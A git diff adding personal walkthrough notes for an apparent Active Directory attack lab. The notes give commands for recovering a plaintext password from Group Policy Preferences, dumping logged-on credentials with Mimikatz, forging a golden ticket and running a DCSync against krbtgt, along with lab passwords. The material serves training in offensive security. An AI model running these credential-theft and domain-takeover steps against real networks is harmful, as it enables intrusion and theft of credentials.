@@ -347,4 +347,8 @@ Primary:WDigest *
   * *Tasks 4 and 5**: Creating golden ticket with `kerberos::golden /sid:S-1-5-21-2984655098-284417223-3543700247 /domain:krbtown.local /user:Administrator /krbtgt:a299249c93e6091f8667e949a6e08c89`. Assuming ticket with `Rubeus.exe ptt /ticket:ticket.kirbi` and then I used `PsExec64.exe \\dc01.krbtown.local cmd` and then I navigated to the directory. Remember `type` is equivalent of `cat` for Windows.
  
 ##### LAB: Active Directory Domain Passwords
-* You'll need to use Get-GPPPassword to find the plaintext password of a local administrator in GPP. Next, you'll need to use Mimikatz to dump a logged-in Domain Admin's credentials, before using the dumped Domain Admin's credentials to run a DCSync attack against the **ORCHID/krbtgt** account. 
+* You'll need to use Get-GPPPassword to find the plaintext password of a local administrator in GPP. Next, you'll need to use Mimikatz to dump a logged-in Domain Admin's credentials, before using the dumped Domain Admin's credentials to run a DCSync attack against the **ORCHID/krbtgt** account.
+* **Task 1**: `xfreerdp /v:10.102.9.46 /u:m.gibbs /p:jWU9G2Ux#MDxOBrHik /dynamic-resolution +clipboard +drives /drive:share,/home/kali`
+* **Tasks 2 and 3**: `. .\Get-GPPPassword.ps1` and then `Get-GPPPassword`. We found the username `NewAdmin` and the password `PasswordInGPPIsNotSafe`.
+* **Tasks 7 and 8**: `xfreerdp /v:10.102.9.46 /u:NewAdmin /p:PasswordInGPPIsNotSafe /dynamic-resolution +clipboard +drives /drive:share,/home/kali`. Used `privilege::debug` and then `sekurlsa::logonpasswords` and found j.russ's password, which was `fV#8zB2H@7xC6Q!PjuZ&JLqX`. j.russ was a domain admin - so this is the jackpot!
+* Next tasks was a DCSync attack, which I did with `lsadump::dcsync /user:ORCHID\krbtgt`. I had to double check the FQDN name with `systeminfo | findstr /B /C:"Domain"`. 
